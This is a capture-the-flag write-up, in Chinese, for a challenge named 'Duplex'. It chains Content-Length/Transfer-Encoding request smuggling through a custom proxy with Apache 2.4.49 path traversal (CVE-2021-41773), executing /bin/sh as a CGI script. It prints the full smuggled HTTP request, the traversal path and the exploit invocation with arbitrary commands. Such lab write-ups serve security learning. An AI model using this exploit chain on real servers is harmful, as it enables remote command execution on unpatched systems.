# Duplex — WRITEUP

**Flag: `K17{un4_p3t1t10_dupl3x_53n5u5...}`**

> flag 结尾的 `...` 是**字面量**，不是截断。用 `od -c` 数过远程 `/getflag` 的原始输出：
> `0000000 K 1 7 { u n 4 _ p 3 t 1 t 1 0 _` / `0000020 d u p l 3 x _ 5 3 n 5 u 5 . . .` /
> `0000040 } \n`，共 34 字节，正好等于 Apache 给的 chunk 长度 `0x22`。
> 题目 index.html 那句 **"Pars posterior vivit"（后半段活着）** 就是在点这个。

## 题面

`Run '/getflag'. That will be it.` —— 一个 `httpd:2.4.49` 容器，前面挂了个自写的 TCP 前端 `proxy`。

## 两半漏洞

### 1. 前端 `proxy`：CL/TE 请求走私

反汇编（`objdump -d`，二进制没符号但很小）读出来的行为：

- `0x1f90` = **8080** 监听（`htons`），转发到 `getaddrinfo("127.0.0.1", "80")`；
- 只读**第一行请求行**，用 `sscanf(buf, "%15s %1023s")` 取 method + path，
  然后 `strcmp(path,"/") || strcmp(path,"/health")` —— 不匹配就 `403 Forbidden`；
- 用 `find_content_length()` 拿 CL（`strstr` 找 `\r\n` → `strncasecmp` 比对 `Content-Length:` → `strtol`），
  **只从 socket 读 CL 个字节**当 body；
- 转发前调 `has_transfer_encoding()`：**只要有一个头以 `Transfer-Encoding:` 开头**
  （大小写不敏感，注意它只看"行首是不是这个前缀"），就把**所有 `Content-Length:` 行删掉**
  （函数 @ `0x401a2d`：遍历 `\r\n` 分隔的行，命中 CL 就跳过不拷贝）。

删 CL 本意是避免 CL/TE 冲突，但它**自己仍然按 CL 读字节并原样转发** —— 两边对"请求 1 在哪结束"
的认知就此分家，藏在 body 里的第二个请求能绕过前端检查直达 Apache。

### 2. 后端 Apache 2.4.49：CVE-2021-41773

`Dockerfile` 是 `FROM httpd:2.4.49`，而且配置里

```apache
<Directory />
    Require all granted          # ← 穿越离不开这句
</Directory>
...
ScriptAlias /cgi-bin/ "/usr/local/apache2/cgi-bin/"
```

`/getflag` 权限 `---x--x--x`（**可执行、不可读**），所以不能下载，只能让 Apache **当 CGI 执行**它。
`%2e` 编码绕过了 2.4.49 的路径规范化：

```
/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh
```

从 `/usr/local/apache2/cgi-bin/` 往上退 4 层到 `/`，再落到 `/bin/sh`。
因为 URL 命中的是 `ScriptAlias`，Apache 把穿越到的文件**当 CGI 跑**，
请求体就成了 shell 的 stdin。

## 利用

外层请求（过前端检查的那一个）用 **chunked + Content-Length 双写**：

```
POST / HTTP/1.1
Host: localhost
Transfer-Encoding: chunked
Content-Length: <N>

0

POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1
Host: localhost
Content-Length: <M>
Connection: close

echo Content-Type: text/plain; echo; /getflag
```

- 前端：看到 `Transfer-Encoding:` → 删掉 CL → 但按 CL 读满这 N 个字节并转发；
- Apache：按 chunked 解析，`0\r\n\r\n` 结束请求 1，**剩下的字节就是下一个请求**（前后端对
  请求 1 的边界理解不同，所以前端放行的 `POST /` 帮我们把"被禁的路径"运了进去）。

两个坑：

1. 外层 body 必须是**合法的 chunked 报文**再由走私请求续上（`0\r\n\r\n` + 走私请求）。
   这样不依赖 Apache 对 `Transfer-Encoding: identity` 之类怪值的处理，最稳。
2. **CGI 输出必须以 HTTP 头开头**，否则 mod_cgi 直接回 500。所以命令前面要 `echo Content-Type: text/plain; echo;`。
   这也是为什么直接 `GET .../getflag` 会 500 —— 但它确实已经执行了（`/getflag` 打的是
   `uname`/`env` 之类的裸输出），**500 不等于没打通**。

## 复现

```bash
cd ~/work/duplex
python3 exploit.py vm1.secso.cc:20295            # 默认跑 /getflag
python3 exploit.py vm1.secso.cc:20295 'id; ls -la /'
```

单发原始请求用 `probe.py <host:port> <METHOD> <path> [body]`。

## 旁证：这题的攻击路径是怎么被确认的

- `/cgi-bin/printenv`、`/cgi-bin/test-cgi`（都不存在）也是 500 而不是 404 —— 说明 `/cgi-bin/*`
  一律走 CGI handler，exec 失败即 500，**500 是这个 handler 的默认失败态**；
- 走私 `GET /nope` 得到 404、`GET /index.html` 得到 200 —— 证明**走私本身是通的**，不是前端在拦。
